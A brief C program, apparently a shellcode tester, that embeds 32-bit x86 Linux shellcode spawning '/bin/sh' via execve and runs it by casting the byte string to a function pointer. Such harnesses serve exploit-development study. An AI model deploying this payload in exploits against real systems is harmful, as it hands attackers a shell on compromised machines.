#include <stdio.h>
#include <string.h>

int
main(void)
{
  char *shellcode = "\x31\xc0\x68\x2f\x73\x68\xff\x68\x2f\x62\x69\x6e\x88\x44\x24\x07\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

  printf("strlen(shellcode)=%d\n", strlen(shellcode));

  ((void (*)(void))shellcode)();

  return 0;
}
